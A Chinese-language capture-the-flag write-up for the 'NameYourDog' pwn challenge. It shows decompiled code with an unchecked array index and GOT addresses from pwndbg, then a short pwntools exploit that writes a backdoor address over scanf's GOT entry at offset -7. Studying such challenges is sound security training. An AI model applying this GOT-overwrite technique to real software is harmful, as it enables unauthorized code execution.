
## NameYourDog
- 题目描述：
    
    > Author: ColdShield
- 题目附件：[NameYourDog](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/NameYourDog/NameYourDog)
- 考察点：数组越界
- 难度：简单
- 初始分值：1000
- 最终分值：995
- 完成人数：5

### 程序分析

程序流程如下：

```
   __  ___    ______   ___    
  /  |/  /__ /_  __/__<  /_ __
 / /|_/ / _ `// / / __/ /\ \ /
/_/  /_/\_,_//_/ /_/ /_//_\_\ 

I bought you five male dogs.Name for them?
Name for which?
>1
Give your name plz: Imagin
You get 1 dogs!!!!!!
Whatever , the author prefers cats ^.^
His name is:Imagin

```

就是可以给狗狗起名字，好像一共可以给五只狗狗起名字。

漏洞在起名字函数这里，程序没有检查`Dogs`数组的`index`是否合法：

```c
int vulnerable(){
// ...
	v1 = NameWhich((int)&Dogs);
// ...
}
int __cdecl NameWhich(int a1){
  int index; // [esp+18h] [ebp-10h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]
  v3 = __readgsdword(0x14u);
  printf("Name for which?\n>");
  __isoc99_scanf("%d", &index);
  printf("Give your name plz: ");
  __isoc99_scanf("%7s", 8 * index + a1);
  return index;
}
```

因此可以造成数组的越界写。

### 解题思路

`Dogs`位于bss段，距离程序GOT表很近，因此可以考虑改函数的GOT表为后门地址。 

```nasm
pwndbg> p &Dogs 
$1 = (<data variable, no debug info> *) 0x804a060 <Dogs>

pwndbg> got
GOT protection: Partial RELRO | GOT functions: 8
[0x804a00c] printf@GLIBC_2.0 -> 0x8048446 (printf@plt+6) ◂— push   0 /* 'h' */
[0x804a010] alarm@GLIBC_2.0 -> 0xf7e92480 (alarm) ◂— mov    edx, ebx
[0x804a014] __stack_chk_fail@GLIBC_2.4 -> 0x8048466 (__stack_chk_fail@plt+6) ◂— push   0x10
[0x804a018] puts@GLIBC_2.0 -> 0xf7e3a210 (puts) ◂— push   ebp
[0x804a01c] system@GLIBC_2.0 -> 0x8048486 (system@plt+6) ◂— push   0x20 /* 'h ' */
[0x804a020] __libc_start_main@GLIBC_2.0 -> 0xf7deb660 (__libc_start_main) ◂— call   0xf7f0a689
[0x804a024] setvbuf@GLIBC_2.0 -> 0xf7e3a860 (setvbuf) ◂— push   ebp
[0x804a028] __isoc99_scanf@GLIBC_2.7 -> 0x80484b6 (__isoc99_scanf@plt+6) ◂— push   0x38 /* 'h8' */
```

`scanf`函数会在给下一只狗狗起名字的时候调用，所以选择改写`scanf`的got表即可

偏移量：`(0x804a028-0x804a060)/8=-7`

### exp

```python
shell = p32(0x080485CB)
sla('>','-7')
sla('Give your name plz: ',shell)
```

